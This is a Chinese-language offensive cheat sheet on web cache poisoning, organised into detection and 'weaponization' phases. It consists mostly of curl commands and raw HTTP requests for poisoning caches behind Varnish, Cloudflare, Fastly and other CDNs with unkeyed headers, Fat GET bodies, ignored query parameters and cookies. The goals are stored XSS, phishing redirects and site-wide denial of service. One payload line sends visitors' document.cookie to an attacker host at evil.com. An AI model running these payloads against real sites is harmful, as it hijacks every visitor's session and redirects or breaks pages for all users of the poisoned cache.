# Web Cache Poisoning (缓存投毒) 实战参考
- HTTP 请求走私配合投毒 → `web-http-smuggling.md`
- Host 头注入投毒 → `web-host-header.md`

> 阶段分离: [攻击] 检测缓存行为+未键化头部 → [利用] 投毒XSS/重定向/拒绝服务

> **last_updated**: 2026-06-04 | **tested_against**: Varnish, Cloudflare, Akamai, Fastly, CloudFront
---

# 攻击阶段 — 检测与识别

## 1. 识别缓存行为

```bash
# === 检测是否有缓存 ===
curl -I https://target.com/ | grep -E "Cache|X-Cache|CF-Cache|Age|Via"

# 常见缓存头:
# X-Cache: HIT / MISS / HIT from xxx
# CF-Cache-Status: HIT
# Age: 123
# Cache-Control: public, max-age=...
```

### 1.1 缓存键识别

```
缓存键 = Host + Path + QueryString (部分)
非键化 = 其他headers + body

投毒原理: 修改非键化输入 → 响应被缓存 → 后续用户拿到被篡改的响应
```

### 1.2 找非键化输入

```bash
# 对每个请求头测试 → 看是否影响响应
curl -H "X-Forwarded-Host: evil.com" https://target.com/
curl -H "X-Forwarded-Scheme: http" https://target.com/
curl -H "X-Forwarded-For: 1.1.1.1" https://target.com/
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/

# 如果响应中的URL/内容被修改 → 非键化输入确认
```

---

# 利用阶段 — 武器化

## 2. XSS via 缓存投毒

```bash
# 场景: 页面反射 X-Forwarded-Host 到script标签中
# 正常: <script src="https://target.com/js/app.js">

# 投毒:
curl -H "X-Forwarded-Host: evil.com" https://target.com/

# 缓存的响应: <script src="https://evil.com/js/app.js">
# → 所有访问者加载攻击者的JS → XSS

# 攻击者服务器上的 /js/app.js:
# document.location='http://evil.com/steal?c='+document.cookie
```

## 3. 重定向投毒

```bash
# 场景: 响应中重定向的Host来自请求头
# 正常: 302 → Location: https://target.com/login

# 投毒:
curl -H "X-Forwarded-Host: evil.com" https://target.com/redirect-here

# 缓存的响应: 302 → Location: https://evil.com/login
# → 所有用户被重定向到钓鱼站
```

## 4. DoS via 缓存投毒

```bash
# 场景: 让关键资源缓存错误内容
curl -H "X-Forwarded-Host: 0" https://target.com/style.css
# → 响应含404页面 → 缓存 → 全站CSS崩溃
```

## 5. 常用非键化头部列表

```bash
# 投毒测试清单:
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Forwarded-Port: 8080
X-Forwarded-Proto: http
X-Forwarded-For: evil.com
X-Original-URL: /xss
X-Rewrite-URL: /xss
X-HTTP-Method-Override: PUT
X-Forwarded-Server: evil.com
Origin: https://evil.com
Referer: https://evil.com
```

## 6. 缓存层特定攻击

### 6.1 Varnish 缓存投毒

```bash
# Varnish 默认: GET + 无Cookie = 可缓存
# 投毒路径:
curl -H "X-Forwarded-Host: evil.com" "https://target.com/static/app.js"
# → Varnish缓存: /static/app.js 内容包含 evil.com 引用
# → 所有用户加载: <script src="https://evil.com/app.js">

# VCL 配置缺陷检查:
# 如果 VCL 只对Host+Path做hash → 其他header不在hash中 → 可投毒
```

### 6.2 Cloudflare / CDN 缓存投毒

```bash
# CDN 缓存键策略差异:
# Cloudflare: 默认 Host + Path + QueryString
# 非键化Header → 可投毒
curl -H "X-Forwarded-Host: evil.com" "https://target.com/" \
  -H "CF-Connecting-IP: 127.0.0.1"
# 如果响应中使用了CF-Connecting-IP → 且不在缓存键中 → 可投毒

# 查看Cloudflare缓存状态:
curl -I "https://target.com/" | grep -i "cf-cache-status"
# CF-Cache-Status: HIT → 缓存命中
```

### 6.3 Fastly 缓存投毒

```bash
# Fastly 缓存键配置可在 VCL 自定义
# 测试: 检查哪些header影响内容但不影响缓存键
for header in "X-Forwarded-Host: evil.com" "X-Forwarded-Scheme: http" \
              "X-Forwarded-Proto: http" "X-Forwarded-Port: 80"; do
  curl -s -H "$header" "https://target.com/" | grep -c "evil" && echo "[+] $header"
done
```

## 7. Fat GET 投毒

```bash
# 某些缓存: GET 请求的 Body 不计入缓存键, 但影响后端响应
GET / HTTP/1.1
Host: target.com
Content-Length: 30

x=1&y=<script>alert(1)</script>

# ★ GET带Body → 后端处理body → 响应含XSS
# → 缓存以 GET / 为键 → 缓存了含XSS的响应!
```

## 8. 缓存键归一化攻击

```bash
# 缓存键 = 去除特定参数的URL → 添加被去除的参数可投毒
# 例: 缓存键排除 utm_* 参数

# 正常: /page?utm_campaign=foo → 缓存键: /page
# 投毒: /page?utm_campaign=foo&callback=alert(1)
# → 缓存键: /page (utm_*被忽略)
# → 响应包含 callback=alert(1)
# → 其他用户访问 /page → 拿到投毒响应!

# 检测:
# 访问 /test?a=1&utm_source=x → 观察缓存是否忽略utm_source
```

## 9. 未键化Cookie投毒

```bash
# 某些缓存: 只对特定Cookie做hash, 其他Cookie不计入缓存键
# 投毒:
curl -b "unkeyed_cookie=<script>alert(1)</script>" "https://target.com/page"

# 缓存以 忽略unkeyed_cookie 的键存储 → 所有用户受影响
```

---
## 相关参考
- HTTP 请求走私配合投毒 → `web-http-smuggling.md`
- Host 头注入投毒 → `web-host-header.md`

*参考: PortSwigger Web Cache Poisoning + CWE-525 + 实战案例*
